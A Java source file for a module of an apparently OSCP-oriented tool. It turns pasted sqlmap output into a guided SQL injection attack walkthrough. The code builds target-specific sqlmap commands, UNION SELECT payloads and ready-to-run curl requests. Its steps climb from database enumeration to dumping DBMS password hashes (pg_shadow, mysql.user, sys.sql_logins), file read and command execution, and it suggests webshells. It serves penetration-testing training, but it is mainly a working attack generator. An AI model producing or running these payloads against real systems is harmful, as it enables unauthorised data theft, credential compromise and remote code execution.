package silverdetector.detect;

import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import silverdetector.core.Detection;
import silverdetector.core.Detector;
import silverdetector.core.Document;
import silverdetector.core.Finding;
import silverdetector.core.Kb;
import silverdetector.core.Row;
import silverdetector.core.Severity;
import silverdetector.core.Table;

/**
 * Paste the sqlmap command you ran and its output, and this walks you through the rest of the
 * attack - step by step, in order, with your own target baked into each command AND the manual
 * (by-hand) SQL for every step, so you learn the injection instead of only leaning on sqlmap.
 *
 * <p>It reads what sqlmap already found (the DBMS, the vulnerable parameter, which techniques
 * worked, the UNION column layout) and produces the standard ladder: fingerprint &amp; privileges
 * -> databases -> tables -> columns -> dump -> DBMS hashes -> file read -> command execution.
 * Every step reconstructs the exact sqlmap command from your URL/cookie/parameter and shows the
 * equivalent hand-written SQL for the detected DBMS.
 *
 * <p>The ladder lives in {@code data/sqlmap_steps.tsv} and the manual SQL in
 * {@code data/sqlmap_dbms.tsv}, so you can extend or correct either without touching code. Unlike
 * the other detectors this one returns its findings in walkthrough order, not by severity - the
 * report prints them exactly as returned.
 */
public final class SqlmapDetector implements Detector {

    private static final Pattern URL = Pattern.compile(
            "(?:-u|--url)(?:=|\\s+)(\"[^\"]*\"|'[^']*'|\\S+)");
    private static final Pattern COOKIE = Pattern.compile(
            "--cookie(?:=|\\s+)(\"[^\"]*\"|'[^']*'|\\S+)");
    private static final Pattern DATA = Pattern.compile(
            "--data(?:=|\\s+)(\"[^\"]*\"|'[^']*'|\\S+)");
    private static final Pattern PARAM_FLAG = Pattern.compile("-p\\s+(\\S+)");
    private static final Pattern PARAM_LINE = Pattern.compile(
            "(?i)^Parameter:\\s*(\\S+)\\s*\\((GET|POST|COOKIE|[A-Z]+)\\)");
    private static final Pattern DBMS_LINE = Pattern.compile("(?i)back-end DBMS:\\s*(.+)");
    private static final Pattern TYPE_LINE = Pattern.compile("(?i)^\\s*Type:\\s*(.+)");
    private static final Pattern COLS_LINE = Pattern.compile("(?i)-\\s*(\\d+)\\s*columns");
    private static final Pattern UNION_PAYLOAD = Pattern.compile("(?i)UNION\\s+ALL\\s+SELECT\\s+(.+)");
    private static final Pattern DBA_LINE = Pattern.compile("(?i)current user is DBA:\\s*(true|false)");

    @Override
    public String id() {
        return "sqlmap";
    }

    @Override
    public String name() {
        return "sqlmap - guided SQL injection walkthrough";
    }

    @Override
    public String accepts() {
        return "the sqlmap command you ran plus its output (the 'Parameter:'/'Type:'/'back-end DBMS:' block)";
    }

    @Override
    public int order() {
        return 18;
    }

    /** The steps are a walkthrough - fingerprint -> dump -> RCE - so they print in that order,
     *  not re-ranked by severity like every other detector. */
    @Override
    public boolean sequential() {
        return true;
    }

    @Override
    public Detection sniff(Document doc) {
        int signals = 0;
        boolean strong = false;
        for (Document.Line line : doc.contentLines()) {
            String text = Signatures.clean(line.text());
            String lower = text.toLowerCase();
            if (lower.contains("sqlmap.org") || lower.contains("sqlmap resumed")
                    || lower.contains("sqlmap identified") || lower.contains("back-end dbms:")) {
                strong = true;
            }
            if (lower.contains("sqlmap") || TYPE_LINE.matcher(text).find()
                    || PARAM_LINE.matcher(text).find() || lower.startsWith("payload:")) {
                signals++;
            }
        }
        if (!strong && signals < 2) {
            return Detection.NONE;
        }
        return Detection.of(strong ? 96 : 60, "sqlmap output - SQL injection walkthrough");
    }

    /** Everything parsed out of the paste. */
    private record Context(String url, String cookie, String data, String param, String method,
                           String dbmsKey, String dbmsLabel, Set<String> techniques,
                           int unionCols, int unionStrIdx, Boolean dba, String os, String webtech) {

        boolean hasUnion() {
            return techniques.stream().anyMatch(t -> t.toLowerCase().contains("union"));
        }

        boolean hasStacked() {
            return techniques.stream().anyMatch(t -> t.toLowerCase().contains("stacked"));
        }
    }

    @Override
    public List<Finding> analyze(Document doc) {
        Context ctx = parse(doc);
        List<Finding> out = new ArrayList<>();

        out.add(headline(ctx));

        Table steps = Kb.table("sqlmap_steps");
        int shown = 0;
        for (Row step : steps.rows()) {
            if (!applies(step.get("needs"), ctx)) {
                continue;
            }
            out.add(stepFinding(++shown, step, ctx));
        }

        out.add(manualLesson(ctx));
        return out;
    }

    private boolean applies(String needs, Context ctx) {
        return switch (needs) {
            case "always" -> true;
            case "union" -> ctx.hasUnion();
            case "stacked" -> ctx.hasStacked();
            case "dba" -> ctx.dba() == null || ctx.dba();
            case "stacked_or_dba" -> ctx.hasStacked() || ctx.dba() == null || ctx.dba();
            default -> true;
        };
    }

    private Finding headline(Context ctx) {
        String techniques = ctx.techniques().isEmpty() ? "an injection" : String.join(", ", ctx.techniques());
        String union = ctx.hasUnion() && ctx.unionCols() > 0
                ? " UNION has " + ctx.unionCols() + " columns (data comes back in column #" + ctx.unionStrIdx() + ")."
                : "";
        String detail = "sqlmap has a WORKING injection on parameter '" + ctx.param() + "' (" + ctx.method()
                + ") against " + ctx.dbmsLabel() + ". The hard part is done - you do not need to re-find it. "
                + "Below is the full ladder from here to credentials and, where the DBMS allows, command "
                + "execution." + union;
        Finding f = Finding.of(Severity.CRITICAL, "SQLi confirmed", "SQL injection CONFIRMED by sqlmap",
                detail, "", 0);
        f = f.note("target: " + (ctx.url().isEmpty() ? "(URL not in the paste - fill it in)" : ctx.url()));
        f = f.note("techniques that worked: " + techniques);
        if (ctx.dba() != null) {
            f = f.note("current DB user is " + (ctx.dba() ? "a DBA - file read and command execution are on the table"
                    : "NOT a DBA - stick to reading data unless stacked queries work"));
        }
        f = f.note("run everything below with --batch (auto-answer) and --threads 10 (faster); add --dbms="
                + shortDbms(ctx.dbmsKey()) + " so sqlmap skips re-detecting. Run without -q to see every step.");
        if (!ctx.os().isEmpty() || !ctx.webtech().isEmpty()) {
            String host = (ctx.os().isEmpty() ? "" : "OS " + ctx.os())
                    + (ctx.os().isEmpty() || ctx.webtech().isEmpty() ? "" : ", ")
                    + (ctx.webtech().isEmpty() ? "" : "web " + ctx.webtech());
            f = f.note("host: " + host + " - this is where a shell from step 8 lands you, and what your "
                    + "file-read paths (step 7) should target.");
        }
        f = f.note("this is guidance you run yourself - and each step shows the manual SQL so you are not "
                + "relying on sqlmap (fine to use once on the OSCP, but learn the by-hand method).");
        return f;
    }

    private Finding stepFinding(int number, Row step, Context ctx) {
        String flags = step.get("flags");
        Severity severity = switch (step.get("manual_key")) {
            case "rce", "fileread" -> Severity.WARN;   // the high-value steps get a colour pop
            default -> Severity.INFO;
        };
        Finding f = Finding.of(severity, "step " + number, "Step " + number + ": " + step.get("title"),
                step.get("what"), "", 0);
        f = f.note("run:  " + baseCommand(ctx) + " " + flags);
        if (step.has("look_for")) {
            f = f.note("look for:  " + step.get("look_for"));
        }
        String manual = manualFor(step.get("manual_key"), ctx);
        if (!manual.isEmpty()) {
            f = f.note("by hand (" + ctx.dbmsLabel() + "):  " + manual);
        }
        return f;
    }

    private Finding manualLesson(Context ctx) {
        StringBuilder detail = new StringBuilder();
        if (ctx.hasUnion() && ctx.unionCols() > 0) {
            detail.append("sqlmap's UNION payload had ").append(ctx.unionCols())
                    .append(" columns and the page echoes back column #").append(ctx.unionStrIdx())
                    .append(". By hand you would first FIND the column count (add ' ORDER BY 1-- -, ' ORDER BY 2-- -, "
                            + "... until it errors, or ' UNION SELECT NULL,NULL,...-- - until it stops erroring), then "
                            + "FIND the visible column (put a marker string in each position and see which prints), "
                            + "then put your query there. sqlmap already did all three for you.");
        } else {
            detail.append("No UNION injection was confirmed, so data does not come straight back in the page. "
                    + "By hand you would extract it with the blind technique that worked - boolean-based (ask a "
                    + "true/false question per bit) or time-based (make it sleep when true), one character at a "
                    + "time. That is slow by hand; sqlmap automates exactly this. If stacked queries work, prefer "
                    + "writing output to a table and reading it back.");
        }
        Finding f = Finding.of(Severity.INFO, "manual SQLi", "How the manual injection works (learn this)",
                detail.toString(), "", 0);
        if (ctx.hasUnion() && ctx.unionCols() > 0) {
            f = f.note("worked example:  " + injectedValue(ctx, unionPayload(ctx, dbmsExpr(ctx, "identity"))));
            if (!ctx.url().isEmpty()) {
                f = f.note("as a request:  " + curl(ctx, unionPayload(ctx, dbmsExpr(ctx, "identity"))));
            }
        }
        f = f.note("references: PortSwigger Web Security Academy (SQL injection), HackTricks SQL Injection, "
                + "and PayloadsAllTheThings/SQL Injection for per-DBMS cheat sheets.");
        return f;
    }

    // ---- manual SQL assembly ------------------------------------------------------------

    private String manualFor(String key, Context ctx) {
        if (key == null || key.isEmpty() || key.equals("none")) {
            return "";
        }
        if (key.equals("passwords")) {
            return passwordsManual(ctx);
        }
        String expr = dbmsExpr(ctx, key);
        if (expr.isEmpty()) {
            return "";
        }
        // rce is a stacked-query technique string, not a UNION-readable expression.
        if (key.equals("rce")) {
            return expr + (ctx.hasStacked()
                    ? "  (stacked queries are confirmed here, so this works as-is)"
                    : "  (needs stacked queries; with only UNION, write a webshell or just dump creds instead)");
        }
        if (!ctx.hasUnion() || ctx.unionCols() <= 0) {
            return expr + "   -- no UNION here, so read it out with the blind/stacked technique (sqlmap --technique)";
        }
        String payload = unionPayload(ctx, expr);
        String line = injectedValue(ctx, payload);
        if (!ctx.url().isEmpty()) {
            line += "      or:  " + curl(ctx, payload);
        }
        return line;
    }

    private String passwordsManual(Context ctx) {
        String expr = switch (ctx.dbmsKey()) {
            case "postgresql" -> "(SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow)";
            case "mysql" -> "(SELECT group_concat(user,0x3a,authentication_string) FROM mysql.user)";
            case "microsoft sql server" -> "(SELECT STRING_AGG(CONCAT(name,':',password_hash),',') FROM sys.sql_logins)";
            case "oracle" -> "(SELECT listagg(name||':'||password,',') WITHIN GROUP (ORDER BY name) FROM sys.user$)";
            default -> "";
        };
        if (expr.isEmpty()) {
            return "read the DBMS user table for this engine (its equivalent of pg_shadow / mysql.user).";
        }
        if (ctx.hasUnion() && ctx.unionCols() > 0) {
            return injectedValue(ctx, unionPayload(ctx, expr));
        }
        return expr + "   (read it out with the confirmed blind/stacked technique)";
    }

    private String dbmsExpr(Context ctx, String key) {
        Row row = Kb.table("sqlmap_dbms").first(ctx.dbmsKey());
        return row == null ? "" : row.get(key);
    }

    /** Builds a UNION SELECT list of the right width with {@code expr} in the visible column. */
    private String unionPayload(Context ctx, String expr) {
        int cols = Math.max(1, ctx.unionCols());
        int idx = Math.min(Math.max(1, ctx.unionStrIdx()), cols);
        StringBuilder select = new StringBuilder();
        for (int i = 1; i <= cols; i++) {
            if (i > 1) {
                select.append(',');
            }
            select.append(i == idx ? expr : "NULL");
        }
        return "' UNION SELECT " + select + comment(ctx);
    }

    /** "search=' UNION SELECT ...-- -" - the parameter and the value to inject. */
    private String injectedValue(Context ctx, String payload) {
        return ctx.param() + "=" + payload;
    }

    /** A ready-to-run curl for a GET injection (URL-encoded), or the --data form for POST. */
    private String curl(Context ctx, String payload) {
        String cookie = ctx.cookie().isEmpty() ? "" : " -b \"" + ctx.cookie() + "\"";
        if ("POST".equalsIgnoreCase(ctx.method()) && !ctx.data().isEmpty()) {
            String data = replaceParamValue(ctx.data(), ctx.param(), payload);
            return "curl -s" + cookie + " --data \"" + data + "\" \"" + stripQuery(ctx.url()) + "\"";
        }
        String injected = replaceParamValue(queryOf(ctx.url()), ctx.param(), payload);
        return "curl -s" + cookie + " \"" + stripQuery(ctx.url()) + "?" + urlencode(injected) + "\"";
    }

    private String comment(Context ctx) {
        Row row = Kb.table("sqlmap_dbms").first(ctx.dbmsKey());
        return row == null ? "-- -" : row.get("comment", "-- -");
    }

    private static String shortDbms(String key) {
        return switch (key) {
            case "postgresql" -> "postgresql";
            case "mysql" -> "mysql";
            case "microsoft sql server" -> "mssql";
            case "oracle" -> "oracle";
            case "sqlite" -> "sqlite";
            default -> key.isEmpty() ? "<dbms>" : key;
        };
    }

    // ---- URL helpers --------------------------------------------------------------------

    private String baseCommand(Context ctx) {
        StringBuilder sb = new StringBuilder("sqlmap -u \"")
                .append(ctx.url().isEmpty() ? "<URL>" : ctx.url()).append('"');
        if (!ctx.cookie().isEmpty()) {
            sb.append(" --cookie=\"").append(ctx.cookie()).append('"');
        }
        if (!ctx.data().isEmpty()) {
            sb.append(" --data=\"").append(ctx.data()).append('"');
        }
        if (!ctx.param().isEmpty()) {
            sb.append(" -p ").append(ctx.param());
        }
        sb.append(" --batch");
        return sb.toString();
    }

    private static String stripQuery(String url) {
        int q = url.indexOf('?');
        return q >= 0 ? url.substring(0, q) : url;
    }

    private static String queryOf(String url) {
        int q = url.indexOf('?');
        return q >= 0 ? url.substring(q + 1) : "";
    }

    /** Replaces {@code param=...} in a query/data string with {@code param=payload}. */
    private static String replaceParamValue(String query, String param, String payload) {
        if (query.isEmpty() || param.isEmpty()) {
            return param + "=" + payload;
        }
        String[] parts = query.split("&");
        boolean found = false;
        for (int i = 0; i < parts.length; i++) {
            String p = parts[i];
            int eq = p.indexOf('=');
            String name = eq >= 0 ? p.substring(0, eq) : p;
            if (name.equals(param)) {
                parts[i] = param + "=" + payload;
                found = true;
            }
        }
        if (!found) {
            return query + "&" + param + "=" + payload;
        }
        return String.join("&", parts);
    }

    /** Minimal URL-encoding of the characters that actually break a shell/URL here. */
    private static String urlencode(String s) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case ' ' -> sb.append("%20");
                case '\'' -> sb.append("%27");
                case '"' -> sb.append("%22");
                case '#' -> sb.append("%23");
                case '+' -> sb.append("%2b");
                default -> sb.append(c);
            }
        }
        return sb.toString();
    }

    // ---- parsing ------------------------------------------------------------------------

    private Context parse(Document doc) {
        String url = "";
        String cookie = "";
        String data = "";
        String param = "";
        String method = "GET";
        String dbmsKey = "";
        String dbmsLabel = "the database";
        Set<String> techniques = new LinkedHashSet<>();
        int cols = 0;
        int strIdx = 1;
        Boolean dba = null;
        String os = "";
        String webtech = "";

        for (Document.Line raw : doc.contentLines()) {
            String line = Signatures.clean(raw.text());
            String lower = line.toLowerCase();

            if (lower.contains("sqlmap") && (line.contains("-u") || line.contains("--url"))) {
                url = firstNonEmpty(url, unquote(group(URL, line)));
                cookie = firstNonEmpty(cookie, unquote(group(COOKIE, line)));
                data = firstNonEmpty(data, unquote(group(DATA, line)));
                String p = group(PARAM_FLAG, line);
                if (!p.isEmpty()) {
                    param = p;
                }
            }

            Matcher pm = PARAM_LINE.matcher(line);
            if (pm.find()) {
                if (param.isEmpty()) {
                    param = pm.group(1);
                }
                method = pm.group(2).toUpperCase();
            }

            Matcher dm = DBMS_LINE.matcher(line);
            if (dm.find() && dbmsKey.isEmpty()) {
                dbmsLabel = dm.group(1).strip();
                dbmsKey = normaliseDbms(dbmsLabel);
                Row row = Kb.table("sqlmap_dbms").first(dbmsKey);
                if (row != null) {
                    dbmsLabel = row.get("label", dbmsLabel);
                }
            }

            Matcher tm = TYPE_LINE.matcher(line);
            if (tm.find()) {
                techniques.add(cleanTechnique(tm.group(1)));
            }

            if (lower.contains("union") && lower.contains("columns")) {
                Matcher cm = COLS_LINE.matcher(line);
                if (cm.find()) {
                    cols = Integer.parseInt(cm.group(1));
                }
            }
            if (lower.contains("payload:") && lower.contains("union")) {
                Matcher up = UNION_PAYLOAD.matcher(line);
                if (up.find()) {
                    int[] parsed = parseUnionColumns(up.group(1));
                    if (parsed[0] > 0) {
                        if (cols == 0) {
                            cols = parsed[0];
                        }
                        strIdx = parsed[1];
                    }
                }
            }

            Matcher dbam = DBA_LINE.matcher(line);
            if (dbam.find()) {
                dba = dbam.group(1).equalsIgnoreCase("true");
            }
            if (lower.startsWith("web server operating system:")) {
                os = line.substring(line.indexOf(':') + 1).strip();
            }
            if (lower.startsWith("web application technology:")) {
                webtech = line.substring(line.indexOf(':') + 1).strip();
            }
        }

        if (param.isEmpty()) {
            param = "id";   // a readable placeholder so the commands still make sense
        }
        if (dbmsKey.isEmpty()) {
            dbmsKey = "postgresql";   // harmless default; every expression still renders
        }
        return new Context(url, cookie, data, param, method, dbmsKey, dbmsLabel, techniques,
                cols, strIdx, dba, os, webtech);
    }

    /** Returns {columnCount, visibleColumnIndex} from a UNION SELECT list; {0,1} if unparsable. */
    private static int[] parseUnionColumns(String selectList) {
        // Cut at the sqlmap comment/marker tail ("-- HcSB", "-- -", "#").
        String list = selectList;
        int dash = list.indexOf("-- ");
        if (dash >= 0) {
            list = list.substring(0, dash);
        }
        List<String> cols = splitTopLevel(list);
        if (cols.isEmpty()) {
            return new int[]{0, 1};
        }
        int idx = 1;
        for (int i = 0; i < cols.size(); i++) {
            if (!cols.get(i).strip().equalsIgnoreCase("NULL")) {
                idx = i + 1;
                break;
            }
        }
        return new int[]{cols.size(), idx};
    }

    /** Splits on commas that are not inside parentheses. */
    private static List<String> splitTopLevel(String s) {
        List<String> out = new ArrayList<>();
        int depth = 0;
        int start = 0;
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '(') {
                depth++;
            } else if (c == ')') {
                depth = Math.max(0, depth - 1);
            } else if (c == ',' && depth == 0) {
                out.add(s.substring(start, i));
                start = i + 1;
            }
        }
        if (start < s.length()) {
            out.add(s.substring(start));
        }
        return out;
    }

    private static String normaliseDbms(String label) {
        String l = label.toLowerCase();
        if (l.contains("postgre")) {
            return "postgresql";
        }
        if (l.contains("mysql") || l.contains("mariadb")) {
            return "mysql";
        }
        if (l.contains("microsoft") || l.contains("mssql") || l.contains("sql server")) {
            return "microsoft sql server";
        }
        if (l.contains("oracle")) {
            return "oracle";
        }
        if (l.contains("sqlite")) {
            return "sqlite";
        }
        return "";
    }

    private static String cleanTechnique(String type) {
        String t = type.strip();
        // sqlmap prints e.g. "stacked queries", "UNION query", "boolean-based blind" as the Type.
        return t;
    }

    private static String group(Pattern p, String s) {
        Matcher m = p.matcher(s);
        return m.find() ? m.group(1) : "";
    }

    private static String unquote(String s) {
        String v = s.strip();
        if (v.length() >= 2 && ((v.startsWith("\"") && v.endsWith("\"")) || (v.startsWith("'") && v.endsWith("'")))) {
            return v.substring(1, v.length() - 1);
        }
        return v;
    }

    private static String firstNonEmpty(String a, String b) {
        return !a.isEmpty() ? a : b;
    }
}
